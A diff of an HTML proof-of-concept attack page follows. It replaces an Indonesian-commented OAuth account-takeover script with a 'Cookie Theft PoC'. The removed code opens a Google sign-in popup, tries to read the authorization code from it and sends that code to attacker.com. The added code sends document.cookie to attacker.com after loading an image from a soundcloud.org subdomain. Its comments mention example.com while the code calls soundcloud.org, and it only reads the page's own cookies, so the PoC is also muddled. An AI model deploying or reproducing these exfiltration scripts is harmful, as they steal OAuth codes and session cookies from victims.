@@ -1,46 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>POC ATO FACEBOOK</title>
+    <title>Cookie Theft PoC</title>
 </head>
 <body>
-    <h1>POC - Takeover Facebook Account</h1>
-    
-    <a href="#" id="authLink">Klik disini untuk memulai proses otorisasi</a>
-    
+    <h1>Cookie Theft PoC</h1>
+    <p>Click the button to send a request to example.com and steal cookies.</p>
+    <button id="stealCookies">Steal Cookies</button>
+
     <script>
-        document.getElementById('authLink').onclick = function() {
-            // Buka jendela popup untuk otorisasi OAuth
-            var targetWindow = window.open("https://accounts.google.com/v3/signin/identifier?opparams=%253Fcred_ref%253Dtrue%2526hd%253D*&client_id=YOUR_CLIENT_ID&redirect_uri=https%3A%2F%2Fcollins.soundcloud.org%2F&response_type=code&scope=openid+email", "_blank");
+        document.getElementById('stealCookies').onclick = function() {
+            // Create a new image element to trigger a request to example.com
+            var img = new Image();
+            img.src = "https://airflow.soundcloud.org/"; // Change this to a valid resource on example.com
 
-            // Tunggu dan ambil kode OAuth dari jendela popup
-            var checkPopup = setInterval(function() {
-                try {
-                    // Periksa apakah jendela popup sudah ditutup
-                    if (targetWindow.closed) {
-                        clearInterval(checkPopup);
-                        console.log("Popup closed");
-                        return;
-                    }
-
-                    // Coba akses URL dari iframe di jendela popup
-                    var iframeUrl = targetWindow.frames[0].location.href;
-
-                    // Ekstrak kode OAuth dari URL
-                    var urlParams = new URLSearchParams(new URL(iframeUrl).search);
-                    var oauthCode = urlParams.get('code');
-                    if (oauthCode) {
-                        console.log("OAuth Code:", oauthCode);
-                        // Kirim kode ke server penyerang
-                        var xhr = new XMLHttpRequest();
-                        xhr.open("GET", "https://attacker.com/steal?token=" + encodeURIComponent(oauthCode), true);
-                        xhr.send();
-                    }
-                } catch (e) {
-                    // Tangani kesalahan, biasanya karena pelanggaran SOP
-                    console.log("Error accessing iframe URL:", e);
-                }
-            }, 1000); // Periksa setiap detik
+            // Add an event listener to capture the cookies if the request is successful
+            img.onload = function() {
+                // Since we cannot directly access the cookies, we can send the request to our server
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://attacker.com/steal?cookies=" + document.cookie, true); // Send the cookies to the attacker's server
+                xhr.send();
+            };
         };
     </script>
 </body>
